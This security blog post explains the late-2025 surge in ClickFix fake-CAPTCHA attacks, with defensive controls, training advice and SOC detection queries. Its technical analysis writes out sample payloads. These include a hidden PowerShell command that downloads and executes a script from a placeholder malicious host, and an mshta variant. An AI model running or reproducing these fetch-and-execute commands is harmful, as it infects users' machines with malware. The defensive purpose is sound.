ClickFix Surge: 517% Increase in Fake CAPTCHA Attacks

The checkbox that installs malware. ClickFix attacks have exploded in late 2025, using fake verification prompts to trick users into running PowerShell commands. Your security awareness training didn't prepare you for this.

Trend: Q4 2025 Published: Jan 2, 2026 20 min read
517% Increase in ClickFix Attacks (Q3 to Q4 2025)
TRENDING THREAT: ClickFix attacks have surged 517% between Q3 and Q4 2025, according to threat intelligence reports. This social engineering technique uses fake CAPTCHA verification prompts to trick users into copying and pasting malicious PowerShell commands—bypassing traditional email filters and security controls.

Why This Attack Works

ClickFix exploits a critical gap in security awareness: users are trained to recognize phishing emails, but not fake verification prompts. The attack succeeds because:

  • CAPTCHAs are ubiquitous: Users click through dozens of verification prompts weekly
  • Trust transference: Fake CAPTCHAs inherit trust from legitimate ones
  • Browser context: Attacks happen in the browser, not via email
  • User participation: Victims actively execute the malware themselves
  • Security bypass: No malicious file is downloaded—just clipboard content

The uncomfortable truth: Traditional security tools and training are failing against attacks that weaponize user actions rather than software vulnerabilities.

How ClickFix Works

The attack follows a carefully designed flow that exploits user trust and automation:

1

Victim Lands on Malicious Page

Via malvertising, compromised websites, SEO poisoning, or phishing links. The page appears legitimate, often mimicking trusted services.

2

Fake CAPTCHA Displayed

A convincing verification prompt appears, resembling Google reCAPTCHA, Cloudflare Turnstile, or similar trusted security widgets.

3

Malicious Payload Copied to Clipboard

When the user interacts with the fake CAPTCHA, JavaScript silently copies a PowerShell command to their clipboard.

4

"Verification" Instructions Displayed

User is instructed to press Win+R (Run dialog), paste the "verification code," and press Enter to "complete verification."

5

User Executes Malware

The pasted PowerShell command downloads and executes malware—infostealers, RATs, or ransomware loaders. Infection complete.

What the User Sees

I'm not a robot
reCAPTCHA
Verification Required

To verify you are human, please:
1. Press Windows + R
2. Press Ctrl + V to paste the verification code
3. Press Enter to complete verification

The above demonstrates what a ClickFix prompt looks like. The "verification code" is actually a malicious PowerShell command.

Technical Analysis

The Clipboard Payload

The command copied to the clipboard typically looks like this:

powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious[.]site/payload.ps1')"

Let's break down the components:

Component Purpose
powershell Invokes PowerShell
-w hidden Runs in hidden window (user sees nothing)
-c Execute the following command
IEX Invoke-Expression (execute downloaded code)
Net.WebClient Creates web client for downloading
DownloadString Fetches script from remote URL

Payload Variations

Attackers use various payload formats to evade detection:

  • Base64 encoded: powershell -enc [base64 string]
  • Obfuscated: String concatenation, variable substitution
  • MSHTA-based: mshta http://evil[.]site/payload.hta
  • CMD chains: cmd /c curl ... | powershell
  • Living-off-the-land: Using certutil, bitsadmin, or other LOLBins
No File = No Detection:

Traditional antivirus scans files on disk. ClickFix attacks execute code directly in memory from remote sources—never touching the filesystem until after infection. This bypasses signature-based detection.

Commoditization Effect

The surge coincides with ClickFix toolkits becoming available for purchase:

  • Turnkey solutions: Pre-built fake CAPTCHA pages
  • Payload integration: Easy connection to malware-as-a-service
  • Traffic services: Malvertising and SEO poisoning for hire
  • Low skill barrier: No coding required to launch campaigns

Why Traditional Security Fails

Email Security: Irrelevant

ClickFix attacks don't necessarily start with email. They can arrive via:

  • Malicious advertisements (malvertising)
  • Compromised legitimate websites
  • Search engine optimization (SEO) poisoning
  • Social media links
  • Direct messages on platforms

Endpoint Protection: Bypassed

Traditional EPP fails because:

  • No malicious file is written to disk initially
  • PowerShell is a legitimate Windows component
  • Execution is initiated by the user (not automated)
  • Payload is fetched from fresh URLs that aren't yet blacklisted

User Training: Outdated

Standard security awareness covers:

  • Suspicious email senders ✓
  • Phishing link detection ✓
  • Attachment dangers ✓
  • Fake CAPTCHA detection ✗
  • Clipboard hijacking ✗
  • Never paste into Run dialog ✗
The Training Gap:

Most security awareness programs haven't updated to include ClickFix-style attacks. Users who pass phishing simulations with flying colors may still fall for fake CAPTCHA tricks.

Detection and Defense

For Organizations

Technical Controls:
  1. PowerShell Constrained Language Mode: Limit PowerShell capabilities for standard users
  2. Script Block Logging: Log all PowerShell executions
  3. AMSI integration: Ensure Antimalware Scan Interface is active
  4. AppLocker/WDAC: Control which scripts can execute
  5. EDR with behavioral analysis: Detect suspicious PowerShell patterns
  6. DNS filtering: Block known malicious domains
  7. Browser isolation: Contain web-based threats

Update Your Training

Add these topics to security awareness programs:

  • Never paste anything into the Windows Run dialog (Win+R)
  • Legitimate CAPTCHAs never ask you to run commands
  • Be suspicious of "verification" that requires typing or pasting
  • If a website asks you to do something unusual, close it
  • When in doubt, contact IT before proceeding

Detection Queries

For SOC teams, here are detection opportunities:

// Suspicious PowerShell from Run Dialog
process where process.name == "powershell.exe" and
process.parent.name == "explorer.exe" and
process.command_line contains_any ("-enc", "-w hidden", "downloadstring", "IEX")

// MSHTA from Run Dialog
process where process.name == "mshta.exe" and
process.parent.name == "explorer.exe" and
process.command_line contains "http"

Campaign Examples

Fake Software Download Pages

Attackers create convincing download pages for popular software:

  • PDF viewers (Adobe Reader lookalikes)
  • Browser updates (Chrome, Edge)
  • Video codecs
  • Meeting software (Zoom, Teams)
  • Cryptocurrency wallets

The fake CAPTCHA appears before the "download," making it seem like legitimate bot protection.

Fake Error Pages

Another variant displays fake browser error messages:

"Your browser needs to verify your connection. Please complete the verification below to continue."

Adult Content Gates

Age verification prompts on adult websites are another common vector, exploiting users who may be hesitant to report issues.
